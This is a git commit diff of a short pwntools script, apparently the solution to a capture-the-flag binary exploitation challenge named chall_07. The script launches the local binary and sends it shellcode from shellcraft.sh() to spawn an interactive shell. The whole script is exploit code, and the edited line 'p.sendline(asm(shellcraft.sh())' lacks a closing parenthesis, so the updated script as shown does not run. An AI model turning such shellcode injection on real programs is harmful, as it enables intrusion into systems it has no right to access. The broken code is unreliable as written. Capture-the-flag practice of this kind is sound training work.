2bee9b51f4a9487f293ace245da0aaaad2fe7e51
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 19:51:58 -0400

    Update 07.py

--- chall_07/07.py
+++ chall_07/07.py
@@ -1,12 +1,5 @@
 from pwn import *
-
 binary = context.binary = ELF('./chall_07')
-
 p = process('./chall_07')
-p.recv()
-
-payload  = b''
-payload += asm(shellcraft.sh())
-
-p.sendline(payload)
+p.sendline(asm(shellcraft.sh())
 p.interactive()
